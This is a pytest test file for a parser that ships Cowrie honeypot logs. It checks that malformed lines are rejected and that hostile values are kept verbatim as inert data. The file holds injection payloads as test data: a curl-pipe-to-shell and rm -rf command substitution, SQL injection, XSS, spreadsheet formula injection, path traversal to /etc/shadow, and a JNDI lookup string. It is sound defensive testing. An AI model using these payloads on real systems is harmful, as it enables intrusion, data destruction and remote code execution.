"""Parser: strict, bounded, never raising, inert on hostile content (P3; FR-005, FR-013, FR-048)."""

from __future__ import annotations

import json
import random
import re
from typing import Any

import pytest

from aitl_common.canonical_json import sha256_hex
from log_shipper.parser import EVENTS, MAX_LINE_BYTES, Accepted, Rejected, parse_line

REASON = re.compile(r"[a-z0-9_.]{1,128}")
BASE: dict[str, Any] = {
    "session": "a1b2c3d4e5f6",
    "timestamp": "2025-03-01T10:15:30.123456Z",
    "src_ip": "203.0.113.7",
    "sensor": "aitl-honeypot",
}
VALID: dict[str, dict[str, Any]] = {
    "cowrie.session.connect": {
        "src_port": 51234,
        "dst_ip": "192.0.2.10",
        "dst_port": 2222,
        "protocol": "ssh",
    },
    "cowrie.client.version": {"version": "SSH-2.0-libssh_0.9.6"},
    "cowrie.client.kex": {"hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"},
    "cowrie.client.size": {"width": 80, "height": 24},
    "cowrie.client.var": {"name": "LANG", "value": "C"},
    "cowrie.client.fingerprint": {},
    "cowrie.session.params": {"arch": "linux-x64-lsb"},
    "cowrie.login.failed": {"username": "root", "password": "123456"},
    "cowrie.login.success": {"username": "root", "password": "hunter-x"},
    "cowrie.command.input": {"input": "uname -a"},
    "cowrie.command.failed": {"input": "frobnicate"},
    "cowrie.command.success": {"input": "ls"},
    "cowrie.session.file_download": {
        "url": "http://198.51.100.9/x.sh",
        "shasum": "e" * 64,
        "outfile": "var/lib/cowrie/downloads/" + "e" * 64,
    },
    "cowrie.session.file_download.failed": {"url": "http://198.51.100.9/y"},
    "cowrie.session.file_upload": {"filename": "a.bin", "shasum": "f" * 64},
    "cowrie.direct-tcpip.request": {"dst_ip": "example.invalid", "dst_port": 443},
    "cowrie.direct-tcpip.data": {},
    "cowrie.log.closed": {"size": 10},
    "cowrie.session.closed": {"duration": "12.3"},
}


def line(kind: str = "cowrie.command.input", **overrides: Any) -> bytes:
    """A valid line of event ``kind``; ``overrides`` (including ``eventid``) replace fields."""
    event = {"eventid": kind, **BASE, **VALID[kind], **overrides}
    event = {k: v for k, v in event.items() if v is not _DROP}
    return json.dumps(event, separators=(",", ":")).encode()


_DROP = object()


def rejected(raw: bytes) -> Rejected:
    result = parse_line(raw)
    assert isinstance(result, Rejected), result
    assert REASON.fullmatch(result.reason)
    return result


def accepted(raw: bytes) -> Accepted:
    result = parse_line(raw)
    assert isinstance(result, Accepted), result
    return result


def test_allowlist_covers_every_test_event() -> None:
    assert set(VALID) == set(EVENTS)


@pytest.mark.parametrize("eventid", sorted(VALID))
def test_valid_event_accepted_verbatim(eventid: str) -> None:
    raw = line(eventid)
    result = accepted(raw)
    assert result.payload == raw.decode()
    assert result.payload_sha256 == sha256_hex(raw)
    assert result.eventid == eventid
    assert result.event_type == EVENTS[eventid].event_type
    assert result.session == BASE["session"]


def test_timestamp_offset_forms_normalize_to_utc() -> None:
    """Cowrie writes `Z` with TZ=UTC and a numeric offset otherwise."""
    for stamp in (
        "2025-03-01T10:15:30.123456Z",
        "2025-03-01T10:15:30.123456+0000",
        "2025-03-01T12:15:30.123456+02:00",
        "2025-03-01T10:15:30Z",
    ):
        result = accepted(line(timestamp=stamp))
        assert result.timestamp.isoformat().startswith("2025-03-01T10:15:30")


# --- parse-stage rejections (shipper_parse) ------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "reason"),
    [
        (b"", "line.empty"),
        (b"x" * (MAX_LINE_BYTES + 1), "line.too_long"),
        (b"\xef\xbb\xbf" + line(), "line.byte_order_mark"),
        (line()[:-1] + b"\r", "line.control_bytes"),
        (line().replace(b"uname", b"un\x00ame"), "line.control_bytes"),
        (line().replace(b"uname", b"\x1b[31muname"), "line.control_bytes"),
        (line().replace(b"uname", b"un\tame"), "line.control_bytes"),
        (line().replace(b"uname", b"un\x7fame"), "line.control_bytes"),
        (b"{not json", "json.invalid"),
        (line()[:-10], "json.invalid"),
        (b'{"eventid":"cowrie.command.input"}{"x":1}', "json.invalid"),
        (b"[1,2,3]", "json.not_an_object"),
        (b'"just a string"', "json.not_an_object"),
        (b"null", "json.not_an_object"),
        (b'{"a":1,"a":2}', "json.duplicate_key"),
        (b'{"eventid":"x","EventID":"y"}', "json.ambiguous_key"),
        (b'{"event id":"x"}', "json.invalid_key"),
        (b'{"\\u00e9v":1}', "json.invalid_key"),
        (b'{"a":NaN}', "json.non_finite_number"),
        (b'{"a":Infinity}', "json.non_finite_number"),
        (b'{"a":-Infinity}', "json.non_finite_number"),
        (b'{"a":' + b"9" * 40 + b"}", "json.number_out_of_range"),
        (b'{"a":1e999}', "json.non_finite_number"),
        (b'{"a":' + b"[" * 50 + b"]" * 50 + b"}", "json.too_deep"),
        (b'{"a":' + b"[" * 100000 + b"]" * 100000 + b"}", "line.too_long"),
        (b'{"a":[' + b",".join([b"1"] * 200) + b"]}", "json.list_too_long"),
        (b"{" + b",".join(f'"k{i}":1'.encode() for i in range(80)) + b"}", "json.too_many_keys"),
    ],
    ids=lambda v: v if isinstance(v, str) else None,
)
def test_parse_stage_rejections(raw: bytes, reason: str) -> None:
    result = rejected(raw)
    assert result.reason == reason
    assert result.stage == "shipper_parse"


def test_deep_nesting_within_line_limit_is_rejected_not_crashing() -> None:
    raw = b'{"a":' + b"[" * 30000 + b"]" * 30000 + b"}"
    assert len(raw) <= MAX_LINE_BYTES
    assert rejected(raw).reason in ("json.invalid", "json.too_deep")


# --- validate-stage rejections (shipper_validate) ------------------------------------------


@pytest.mark.parametrize(
    ("raw", "reason"),
    [
        (line(eventid=_DROP), "event.missing_eventid"),
        (line(eventid=7), "event.missing_eventid"),
        (line(eventid="cowrie.virustotal.scanfile"), "event.unknown_eventid"),
        (line(eventid="cowrie.command.input; DROP TABLE x"), "event.unknown_eventid"),
        (line(session=_DROP), "event.invalid_session"),
        (line(session="A1B2C3D4E5F6"), "event.invalid_session"),
        (line(session="../../etc/passwd"), "event.invalid_session"),
        (line(session="a1b2c3d4' OR '1'='1"), "event.invalid_session"),
        (line(session="a" * 33), "event.invalid_session"),
        (line(session=12345678), "event.invalid_session"),
        (line(timestamp=_DROP), "event.invalid_timestamp"),
        (line(timestamp="2025-03-01T10:15:30"), "event.invalid_timestamp"),
        (line(timestamp="2025-13-01T10:15:30Z"), "event.invalid_timestamp"),
        (line(timestamp="2025-03-01T25:15:30Z"), "event.invalid_timestamp"),
        (line(timestamp="2025-03-01T10:15:30+2500"), "event.invalid_timestamp"),
        (line(timestamp="2025-03-01 10:15:30Z"), "event.invalid_timestamp"),
        (line(timestamp=1740824130), "event.invalid_timestamp"),
        (line(timestamp="1999-12-31T23:59:59Z"), "event.timestamp_out_of_range"),
        (line(timestamp="2100-01-01T00:00:00Z"), "event.timestamp_out_of_range"),
        (line(src_ip="203.0.113.999"), "event.invalid_src_ip"),
        (line(src_ip="localhost"), "event.invalid_src_ip"),
        (line(src_ip="$(curl evil)"), "event.invalid_src_ip"),
        (line(input=_DROP), "event.missing_field.input"),
        (line(input=["uname"]), "event.invalid_field.input"),
        (line(input=None), "event.invalid_field.input"),
        (line("cowrie.session.connect", src_port=70000), "event.invalid_field.src_port"),
        (line("cowrie.session.connect", src_port=True), "event.invalid_field.src_port"),
        (line("cowrie.session.connect", src_port="22"), "event.invalid_field.src_port"),
        (line("cowrie.session.connect", dst_ip="::gg"), "event.invalid_field.dst_ip"),
        (line("cowrie.session.connect", protocol="http"), "event.invalid_field.protocol"),
        (line("cowrie.session.file_download", shasum="E" * 64), "event.invalid_field.shasum"),
        (line("cowrie.session.file_download", shasum="../x"), "event.invalid_field.shasum"),
        (line("cowrie.login.failed", password=12345), "event.invalid_field.password"),
        (line("cowrie.client.size", width=-1), "event.invalid_field.width"),
        (line("cowrie.session.closed", duration="1e9"), "event.invalid_field.duration"),
    ],
)
def test_validate_stage_rejections(raw: bytes, reason: str) -> None:
    result = rejected(raw)
    assert result.reason == reason
    assert result.stage == "shipper_validate"


# --- hostile content is preserved as inert data -------------------------------------------

HOSTILE = [
    "'; DROP TABLE intel_raw.raw_ingest_record; --",
    "1' OR '1'='1",
    "$(rm -rf /) `id` && curl http://198.51.100.9/x | sh; echo $PATH",
    "\x1b[2J\x1b]0;pwned\x07\x1b[31mred",
    'line1\nline2\r\nFAKE LOG LINE {"eventid":"cowrie.login.success"}',
    "<script>alert(document.cookie)</script><img src=x onerror=alert(1)>",
    '=HYPERLINK("http://198.51.100.9","x")',
    "+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "-2+3",
    "‮override​‍﻿zero-width",
    "é́́ combining \U0001f600 emoji 中文",
    "\ud800 lone surrogate \udfff",
    "\x00 nul and \x7f del and \x85 nel",
    "../../../../etc/shadow",
    "..\\..\\windows\\system32",
    "{{7*7}} ${jndi:ldap://198.51.100.9/a} %s%n %(x)s",
    "AKIAFAKEEXAMPLEKEY0 ghp_fakeTokenNotReal000 password=hunter2",
    "A" * 60000,
]


@pytest.mark.parametrize("value", HOSTILE, ids=range(len(HOSTILE)))
def test_hostile_values_are_stored_verbatim_as_data(value: str) -> None:
    raw = line(input=value)
    if len(raw) > MAX_LINE_BYTES:
        assert rejected(raw).reason == "line.too_long"
        return
    result = accepted(raw)
    # Stored exactly as Cowrie wrote it: JSON-escaped, never decoded or executed.
    assert result.payload == raw.decode()
    assert json.loads(result.payload)["input"] == value
    assert not any(ord(c) < 0x20 or ord(c) == 0x7F for c in result.payload)


@pytest.mark.parametrize("field", ["username", "password"])
def test_hostile_credentials_are_data(field: str) -> None:
    for value in HOSTILE[:8]:
        raw = line("cowrie.login.failed", **{field: value})
        assert accepted(raw).payload == raw.decode()


def test_invalid_utf8_is_replaced_not_rejected() -> None:
    """FR-013: invalid sequences are replaced (U+FFFD); the line is still staged."""
    raw = line(input="PLACEHOLDER").replace(b"PLACEHOLDER", b"ab\xff\xfecd\xc3")
    result = accepted(raw)
    assert "�" in result.payload
    assert json.loads(result.payload)["input"].startswith("ab�")
    assert result.payload_sha256 == sha256_hex(result.payload.encode())


def test_parse_line_never_raises_on_mutations() -> None:
    """Deterministic fuzz: byte mutations of valid lines never raise or escape bounds."""
    rng = random.Random(20260923)  # noqa: S311 - deterministic fuzz, not crypto
    seeds = [line(e) for e in sorted(VALID)]
    for _ in range(4000):
        raw = bytearray(rng.choice(seeds))
        for _ in range(rng.randint(1, 8)):
            op = rng.randrange(4)
            pos = rng.randrange(len(raw) + 1)
            if op == 0 and raw:
                raw[min(pos, len(raw) - 1)] = rng.randrange(256)
            elif op == 1:
                raw[pos:pos] = bytes(rng.randrange(256) for _ in range(rng.randint(1, 16)))
            elif op == 2 and raw:
                del raw[pos : pos + rng.randint(1, 16)]
            else:
                raw[pos:pos] = rng.choice([b'"', b"{", b"}", b",", b":", b"\\", b"\\u", b"[", b"]"])
        result = parse_line(bytes(raw))
        if isinstance(result, Rejected):
            assert REASON.fullmatch(result.reason)
        else:
            assert result.eventid in EVENTS
            assert len(result.payload.encode()) <= MAX_LINE_BYTES


def test_reasons_never_contain_content() -> None:
    marker = "zz_attacker_marker"
    samples = [
        line(eventid=f"cowrie.{marker}"),
        line(session=marker),
        line(timestamp=marker),
        f'{{"{marker}":'.encode(),
    ]
    for raw in samples:
        assert marker not in rejected(raw).reason


def test_accepted_exposes_parsed_fields_read_only() -> None:
    """P4 re-validates staged lines with this parser and reads the fields it parsed."""
    result = parse_line(line(input="uname -a"))
    assert isinstance(result, Accepted)
    assert result.fields["input"] == "uname -a"
    assert result.fields["session"] == result.session
    with pytest.raises(TypeError):
        result.fields["input"] = "rm -rf /"  # type: ignore[index]
